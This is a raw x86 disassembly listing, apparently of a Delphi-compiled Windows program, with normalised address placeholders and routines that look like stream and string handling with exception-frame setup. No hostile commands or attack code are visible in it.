xor ebx ebx
xor eax eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_4040e8
mov eax ebx
dec eax
cmp eax [ ebp + 0xc ]
jle r-xdata
mov eax [ esi + 0x74 ]
call sub_462520
mov edx eax
add edx [ ebp - 0xc ]
mov ecx edi
sub ecx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_45d424
mov ebx eax
test ebx ebx
jle r-xdata
test ebx ebx
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov [ ebp - 0xc ] edi
add ebx [ ebp - 0xc ]
test ebx ebx
jle r-xdata
mov eax [ ebp - 0xc ]
cmp eax [ ebp + 0xc ]
jle r-xdata
cmp [ esi + 0x84 ] 0x0
jne r-xdata
mov eax [ esi + 0x74 ]
mov edx [ eax ]
call [ edx ]
mov edi eax
test edi edi
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_404310
mov edx eax
add edx ebx
dec edx
mov ecx [ ebp + 0x8 ]
mov eax [ esi + 0x74 ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
call sub_404310
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_404310
sub ebx eax
mov eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_40445c
jne r-xdata
mov cl 0x1
mov dl 0x1
mov eax esi
mov edi [ eax ]
call [ edi + 0x48 ]
cmp [ ebp - 0x8 ] 0xffffffff
sete al
push eax
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax esi
mov edi [ eax ]
call [ edi + 0x6c ]
test eax eax
sete al
mov [ esi + 0x99 ] al
cmp [ esi + 0x99 ] 0x0
je r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov [ esi + 0x98 ] 0x1
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
mov eax [ esi + 0x74 ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
jmp r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405b50
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b590
call sub_403a08
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx ebx
call sub_40469c
test ebx ebx
jle r-xdata
mov eax [ ebp + 0x8 ]
call sub_404050
jmp r-xdata
cmp [ esi + 0x84 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4617d1
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_404074
lea eax [ ebp - 0x4 ]
call sub_404050
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp [ eax + ebx - 0x1 ] 0xd
jne r-xdata
mov [ esi + 0x98 ] 0x1
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
mov eax [ esi + 0x74 ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_405b50
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b590
call sub_403a08
jmp r-xdata
mov edx ebx
dec edx
mov eax [ ebp + 0x8 ]
call sub_40469c
jmp r-xdata
sub_4617e8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov ebx ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_46185e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_404050
xor esi esi
jmp r-xdata
mov eax [ ebx ]
call sub_404310
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_461865
lea eax [ ebp - 0xc ]
call sub_404050
retn
cmp esi [ ebp - 0x8 ]
jl r-xdata
inc esi
push 0xffffffff
lea eax [ ebp - 0xc ]
push eax
or ecx 0xffffffff
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x70 ]
mov eax [ ebp - 0xc ]
mov edx ebx
call sub_407e14
sub_46186f
inc [ ecx ]
add [ eax ] al
add [ edx ] cl
add [ eax ] al
add [ ebx - 0x75 ] dl
fmul [ ebx - 0x5a178bbd ]
or eax [ eax ]
add dh al
inc ebx
imul eax [ eax ] 0x408dc35b
add [ ebp - 0x75 ] dl
in al dx
push ebx
push esi
mov esi ecx
mov ebx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x7c ]
mov edx esi
mov ecx [ ebp + 0x8 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x60 ]
pop esi
pop ebx
pop ebp
retn 0x4
sub_4618b0
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_41ac60
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x78 ]
jne r-xdata
cmp esi [ edi + 0x7c ]
jne r-xdata
xor eax eax
mov [ edi + 0x78 ] eax
xor eax eax
mov [ edi + 0x7c ] eax
sub_4618f8
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x7c ] 0x0
je r-xdata
test esi esi
jne r-xdata
cmp [ ebx + 0x70 ] 0x0
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_403420
test al al
je r-xdata
xor eax eax
mov [ ebx + 0xac ] eax
jmp r-xdata
lea eax [ ebx + 0x7c ]
call sub_40d19c
mov [ ebx + 0x70 ] 0x0
mov eax esi
mov [ ebx + 0x7c ] eax
test eax eax
je r-xdata
mov [ ebx + 0xac ] esi
pop esi
pop ebx
retn
mov edx ebx
call sub_41aa14
sub_461950
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_404310
test eax eax
jle r-xdata
pop esi
pop ebx
retn
push 0x0
mov edx esi
mov ecx eax
mov eax ebx
call sub_461974
sub_461974
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_461b74
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_461b7b
lea eax [ ebp - 0x1c ]
call sub_404050
retn
test esi esi
je r-xdata
mov cl 0x1
mov dl 0x1
mov eax ebx
mov edi [ eax ]
call [ edi + 0x48 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405b50
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b590
call sub_403a08
mov eax [ ebx + 0xb0 ]
test eax eax
sete dl
or dl [ ebp + 0x8 ]
je r-xdata
mov edx esi
mov ecx [ ebp - 0x4 ]
call sub_416890
mov eax [ ebx + 0xb0 ]
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov esi [ ebx + 0xb4 ]
mov eax esi
cdq
cmp edx [ esp + 0x4 ]
jne r-xdata
push 0x0
push 0x0
mov dl 0x1
mov eax [ r-xdata ]
call sub_461fa8
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_461af5
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_416890
cmp [ ebx + 0x78 ] 0x0
je r-xdata
pop edx
pop eax
jg r-xdata
cmp eax [ esp ]
pop edx
pop eax
ja r-xdata
mov [ ebp - 0xc ] 0x1
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
call sub_41664c
mov eax [ ebx + 0x78 ]
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x4c ]
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
mov [ ebp - 0x4 ] eax
test esi esi
jle r-xdata
jmp r-xdata
mov ecx esi
mov dl 0x1
mov eax ebx
mov edi [ eax ]
call [ edi + 0x34 ]
add [ ebp - 0xc ] esi
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x4 ]
jle r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x5c ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x6c ]
mov edx eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45b710
mov edx esi
mov eax ebx
call sub_461f00
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
mov ecx eax
sub ecx [ ebp - 0xc ]
inc ecx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp - 0xc ]
lea edx [ eax + edx - 0x1 ]
mov eax [ ebx + 0x7c ]
mov esi [ eax ]
call [ esi + 0x58 ]
mov esi eax
xor ecx ecx
xor edx edx
mov eax [ r-xdata ]
call sub_45da5c
test esi esi
sete al
mov [ ebx + 0x69 ] al
xor ecx ecx
mov dl 0x1
mov eax ebx
mov edi [ eax ]
call [ edi + 0x48 ]
push 0x2
mov [ ebp - 0x18 ] 0x274a
mov [ ebp - 0x14 ] 0x2745
mov [ ebp - 0x10 ] 0x2746
lea ecx [ ebp - 0x18 ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx esi
call sub_45b65c
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x8 ]
call sub_40d19c
retn
sub_461b84
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x10 ] ebx
mov ebx ecx
mov esi edx
mov edi eax
xor eax eax
push ebp
push sub_461ca6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_408430
test al al
je r-xdata
lea eax [ ebp - 0xc ]
push eax
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405b50
mov eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x14 ] 0xb
lea edx [ ebp - 0x18 ]
xor ecx ecx
pop eax
call sub_408d10
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b590
call sub_403a08
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
push 0x20
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_416ae0
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_461c49
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push 0x0
mov cl 0x1
mov edx [ ebp - 0x8 ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x80 ]
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_403294
retn
cmp [ edi + 0x78 ] 0x0
jne r-xdata
test bl bl
je r-xdata
cmp [ edi + 0xac ] 0x0
je r-xdata
mov ebx [ rw-data ]
mov ebx [ ebx ]
mov eax [ edi + 0xac ]
mov eax [ eax + 0x68 ]
mov eax [ eax + 0xc ]
mov edx esi
call ebx
mov [ ebp - 0x4 ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_461cad
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_404074
retn
sub_461cb8
push ebx
push ecx
mov [ esp ] edx
mov ebx eax
test cl cl
je r-xdata
push 0x0
lea edx [ esp + 0x4 ]
mov ecx 0x4
mov eax ebx
call sub_461974
pop edx
pop ebx
retn
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov [ esp ] eax
sub_461cec
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_461d34
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov ecx r-xdata
mov edx esi
call sub_40435c
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x78 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_461d3b
lea eax [ ebp - 0x4 ]
call sub_404050
retn
sub_461d43
inc [ edx ]
add [ eax ] al
add [ 0x5500000a ] cl
mov ebp esp
add esp 0xffffffec
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x5 ] cl
mov esi edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_461ec2
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x5 ] 0x0
je r-xdata
test ebx ebx
jne r-xdata
push 0x0
push 0x0
mov eax esi
call sub_41664c
mov eax esi
call sub_41662c
add ebx eax
mov [ ebp - 0x10 ] ebx
mov eax esi
mov edx [ eax ]
call [ edx ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x30 ]
xor eax eax
push ebp
push sub_461ea5
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403264
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_461e86
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xa8 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov cl 0x1
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_461cb8
mov eax esi
call sub_41662c
mov ebx [ ebp - 0x10 ]
sub ebx eax
cmp [ ebp + 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_461e8d
lea eax [ ebp - 0xc ]
call sub_40d19c
retn
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x4 ]
mov ecx ebx
mov eax esi
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx eax
test ebx ebx
jne r-xdata
push 0x0
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x4 ]
mov ecx ebx
mov eax [ ebp - 0x4 ]
call sub_461974
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_405b50
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b590
call sub_403a08
mov eax esi
call sub_41662c
push eax
mov eax [ ebp - 0x10 ]
pop edx
sub eax edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xa8 ]
call sub_45d0f8
mov ebx eax
test ebx ebx
je r-xdata
sub_461ed4
push ebx
mov ebx eax
cmp [ ebx + 0x7c ] 0x0
je r-xdata
pop ebx
retn
mov [ ebx + 0x69 ] 0x1
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ ebx + 0x78 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x7c ]
mov edx [ eax ]
call [ edx + 0x40 ]
mov edx [ eax ]
call [ edx + 0x44 ]
sub_461f00
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0xb0 ]
mov edx [ eax ]
call [ edx ]
cmp edx 0x0
jne r-xdata
jle r-xdata
cmp eax 0x0
jbe r-xdata
pop esi
pop ebx
retn
cmp esi 0xffffffff
je r-xdata
jmp r-xdata
push 0x1
mov esi [ ebx + 0xb0 ]
mov eax esi
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ esi + 0x4 ]
mov eax ebx
call sub_461974
mov eax ebx
call sub_461f8c
jmp r-xdata
mov eax [ ebx + 0xb0 ]
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
cdq
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jle r-xdata
cmp eax [ esp ]
pop edx
pop eax
jbe r-xdata
push 0x1
mov eax [ ebx + 0xb0 ]
mov edx [ eax + 0x4 ]
mov ecx esi
mov eax ebx
call sub_461974
mov edx esi
mov eax [ ebx + 0xb0 ]
mov ecx [ eax ]
call [ ecx + 0x24 ]
jmp r-xdata
sub_461fa8
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403264
mov eax [ ebp + 0x8 ]
mov [ esi + 0x18 ] eax
mov eax [ ebp + 0xc ]
mov [ esi + 0x1c ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035a0
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_461ff0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_462076
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
cdq
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jle r-xdata
cmp eax [ esp ]
pop edx
pop eax
jbe r-xdata
mov eax edi
mov ecx esi
mov edx [ ebx + 0x4 ]
call sub_404140
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x24 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46207d
lea eax [ ebp - 0x4 ]
call sub_404050
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405b50
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b590
call sub_403a08
jmp r-xdata
sub_462084
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_462159
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
cdq
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jle r-xdata
cmp eax [ esp ]
pop edx
pop eax
jbe r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
cdq
cmp edx [ esp + 0x4 ]
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405b50
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b590
call sub_403a08
jmp r-xdata
pop edx
pop eax
jne r-xdata
cmp eax [ esp ]
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
sub ecx esi
mov edi [ ebx + 0x4 ]
mov edx edi
lea eax [ edi + esi ]
call sub_4028e0
mov eax ebx
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
cdq
sub [ esp ] eax
sbb [ esp + 0x4 ] edx
pop eax
pop edx
push edx
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax ebx
call sub_416d3c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_462160
lea eax [ ebp - 0x4 ]
call sub_404050
retn
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
cmp [ ebx + 0x1a ] 0x0
je r-xdata
sub_462168
push ebp
mov ebp esp
add esp 0xfffffff8
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp eax 0xffffffff
jle r-xdata
mov eax esi
pop edi
pop esi
pop ecx
pop ecx
pop ebp
retn 0x4
xor ecx ecx
mov edx eax
test edx edx
jl r-xdata
test cl cl
jne r-xdata
inc edx
mov eax [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x64 ]
add eax 0x2
dec edx
jne r-xdata
mov cl 0x1
jmp r-xdata
cmp si [ eax ]
jne r-xdata
sub_4621b4
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_4622dc
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403264
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4622b2
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov edx 0x7fffffff
mov eax ebx
call sub_4617e8
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov eax [ ebp - 0x4 ]
call sub_404310
cmp eax 0x3
jle r-xdata
mov eax [ ebx + 0x80 ]
mov edx [ ebp - 0x8 ]
call sub_4601f0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4622b9
lea eax [ ebp - 0x8 ]
call sub_40d19c
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x3 ] 0x2d
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
mov ecx 0x3
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_404570
mov edx [ ebp - 0x10 ]
lea eax [ ebp - 0xc ]
mov ecx r-xdata
call sub_40435c
lea eax [ ebp - 0x14 ]
push eax
mov ecx 0x4
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_404570
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
call sub_407ddc
test al al
je r-xdata
lea ecx [ ebp - 0x4 ]
mov edx 0x7fffffff
mov eax ebx
call sub_4617e8
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov eax [ ebp - 0x4 ]
call sub_404310
cmp eax 0x4
jl r-xdata
sub_4622f4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_462342
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_4602fc
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_462349
lea eax [ ebp - 0x4 ]
call sub_404050
retn
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_460078
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x78 ]
sub_462350
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4623f6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x7c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4623fd
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_404074
retn
inc esi
xor ebx ebx
lea ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x7c ]
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x7c ]
jmp r-xdata
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0xc ]
mov edx r-xdata
call sub_40445c
jne r-xdata
inc ebx
dec esi
jne r-xdata
sub_46243c
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
xor edx edx
mov eax esi
call sub_461fa8
mov [ esi + 0x20 ] 0x8000
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035a0
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
call sub_4035f8
pop [ fs : 0x0 ]
add esp 0xc
sub_462484
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_462510
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
cdq
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jle r-xdata
cmp eax [ esp ]
pop edx
pop eax
jbe r-xdata
mov eax ebx
call sub_462520
mov edx eax
mov eax edi
mov ecx esi
call sub_404140
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x24 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_462517
lea eax [ ebp - 0x4 ]
call sub_404050
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405b50
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b590
call sub_403a08
jmp r-xdata
sub_46252c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x24 ]
test esi esi
jle r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ ebx + 0x4 ]
mov eax [ ebx + 0x4 ]
add eax esi
call sub_4028e0
mov eax ebx
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
xor eax eax
mov [ ebx + 0x24 ] eax
sub_462564
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_462618
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
cdq
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jle r-xdata
cmp eax [ esp ]
pop edx
pop eax
jbe r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
cdq
cmp edx [ esp + 0x4 ]
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405b50
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b590
call sub_403a08
jmp r-xdata
jmp r-xdata
pop edx
pop eax
jne r-xdata
cmp eax [ esp ]
cmp [ ebx + 0x1a ] 0x0
je r-xdata
add [ ebx + 0x24 ] esi
mov eax [ ebx + 0x24 ]
cmp eax [ ebx + 0x20 ]
jl r-xdata
mov eax ebx
call sub_462428
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46261f
lea eax [ ebp - 0x4 ]
call sub_404050
retn
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
mov eax ebx
call sub_46252c
sub_462624
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov eax esi
sub ax 0x1
jae r-xdata
mov ecx esi
mov edx edi
mov eax ebx
call sub_416cec
sub eax [ ebx + 0x24 ]
mov edx [ ebx + 0x24 ]
add edx edi
xor ecx ecx
mov eax ebx
call sub_416cec
sub eax [ ebx + 0x24 ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_46265c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_462681
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_462688
retn
sub_462698
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push esp
daa
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi ] bh
inc esi
add [ eax + eax ] dh
add [ eax - 0x4bffba1f ] al
mov al 0x41
add al dl
xor al 0x40
add [ eax ] cl
stosb [ edi ]
inc ecx
add al bl
xor al 0x40
add ah cl
xor al 0x40
add [ edx + esi ] ch
inc eax
add [ eax + 0x32 ] cl
inc eax
add al bl
sub eax 0x48500046
inc ecx
add [ esp + ebp * 4 + 0x476c0041 ] bh
inc ecx
add [ ebp + ebp * 4 + 0x2e1c0041 ] dl
inc esi
add [ ebp + ebp * 4 - 0x5163ffbf ] ah
inc ecx
add ah cl
mov al 0x41
add [ ebp + ebp * 4 - 0x5253ffbf ] dh
inc ecx
add ah dl
mov al 0x41
add al dl
sub eax [ esi ]
hlt
sub_462864
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov esi eax
xor eax eax
push ebp
push sub_4629ca
push [ fs : eax ]
mov [ fs : eax ] esp
cmp esi 0xfffffffe
sete bl
mov cl 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_41a458
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4629ad
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x68 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x40 ] eax
mov eax [ ebp - 0x4 ]
